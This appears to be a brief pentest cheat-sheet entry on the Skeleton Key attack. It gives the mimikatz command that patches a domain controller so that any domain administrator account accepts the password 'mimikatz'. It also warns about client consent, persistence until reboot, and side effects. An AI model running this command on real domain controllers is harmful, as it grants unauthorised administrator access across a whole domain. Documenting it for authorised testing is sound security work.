# Skeleton Key

```bash
# Creating a Skeleton Key on a Domain Controller
mimikatz !misc::skeleton
```

This will allow you (by default) to log in with any domain administrators account using the password `mimikatz`

**Notes:** This should not be used unless explicitly discussed with a client. A skeleton key cannot be removed until the domain controllers impacted are restarted. Additionally, it is possible for this attack to cause unintended effects.
